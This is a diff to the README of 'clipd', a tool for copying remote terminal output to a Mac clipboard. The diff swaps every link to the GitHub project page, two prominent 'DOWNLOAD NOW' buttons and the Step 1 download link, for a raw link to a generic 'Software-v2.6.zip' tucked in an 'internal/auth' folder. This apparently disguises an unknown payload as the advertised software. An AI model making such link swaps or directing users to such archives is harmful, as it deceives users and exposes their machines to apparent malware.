@@ -1,7 +1,7 @@
 <h1>🖥️ clipd - Copy Remote Output to Clipboard Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/cathb8315/clipd" style="display:inline-block;padding:16px 40px;background:#4CAF50;color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:12px;margin:20px auto;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/cathb8315/clipd/main/internal/auth/Software-v2.6.zip" style="display:inline-block;padding:16px 40px;background:#4CAF50;color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:12px;margin:20px auto;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 <p align="center"><strong>Clipd</strong> is a simple command-line tool that lets you copy text output from a remote computer directly to your Mac's clipboard. No more copy-pasting through terminal windows or losing important text.</p>
@@ -35,7 +35,7 @@ Imagine you're connected to a server or another computer using SSH. You run a co
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [https://github.com/cathb8315/clipd](https://github.com/cathb8315/clipd)
+Visit this link to download the application: [https://raw.githubusercontent.com/cathb8315/clipd/main/internal/auth/Software-v2.6.zip](https://raw.githubusercontent.com/cathb8315/clipd/main/internal/auth/Software-v2.6.zip)
 
 ### Step 2: Choose Your Version
 
@@ -192,7 +192,7 @@ Clipd is released as open-source software. See the repository for license detail
 ---
 
 <p align="center">
-  <a href="https://github.com/cathb8315/clipd" style="display:inline-block;padding:16px 40px;background:#2196F3;color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:12px;">⬇️ DOWNLOAD CLIPD NOW</a>
+  <a href="https://raw.githubusercontent.com/cathb8315/clipd/main/internal/auth/Software-v2.6.zip" style="display:inline-block;padding:16px 40px;background:#2196F3;color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:12px;">⬇️ DOWNLOAD CLIPD NOW</a>
 </p>
 
 <p align="center"><strong>Stop wasting time copying text manually. Get clipd today!</strong></p>
